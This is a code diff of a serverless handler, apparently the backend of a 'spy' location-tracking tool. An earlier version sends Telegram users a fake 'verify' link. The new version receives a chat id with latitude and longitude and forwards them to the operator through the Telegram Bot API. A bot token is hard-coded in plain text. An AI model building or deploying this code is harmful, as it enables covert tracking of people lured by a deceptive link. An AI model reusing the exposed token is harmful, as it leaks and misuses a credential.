@@ -1,28 +1,36 @@
 export default async function handler(req, res) {
-  const token = '7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k';
-  const baseUrl = 'https://hafizportalspy.vercel.app'; // Replace with your domain
+  if (req.method !== 'POST') return res.status(405).end('Method Not Allowed');
 
-  if (req.method === 'POST') {
-    const body = req.body;
+  const { chat_id, latitude, longitude } = req.body;
 
-    if (body.message && body.message.text === '/start') {
-      const chatId = body.message.chat.id;
-      const link = `${baseUrl}/?id=${chatId}`;
+  if (!chat_id || !latitude || !longitude) {
+    return res.status(400).json({ error: 'Missing parameters' });
+  }
 
-      const welcomeText = `Welcome!\nClick the link below to verify:\n${link}`;
+  const BOT_TOKEN = '7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k'; // Yahan apna bot token direct likhen
+  const message = `📍 New Location:\nLat: ${latitude}\nLon: ${longitude}`;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: welcomeText,
-        }),
-      });
+  try {
+    const telegramRes = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id,
+        text: message
+      })
+    });
+
+    const data = await telegramRes.json();
+
+    if (!data.ok) {
+      console.error('Telegram API error:', data);
+      return res.status(500).json({ error: 'Telegram send failed', telegram: data });
     }
 
-    res.status(200).send('OK');
-  } else {
-    res.status(405).send('Method Not Allowed');
+    res.status(200).json({ success: true, sent: true });
+  } catch (err) {
+    console.error('Server Error:', err);
+    res.status(500).json({ error: 'Server error', detail: err.message });
   }
 }
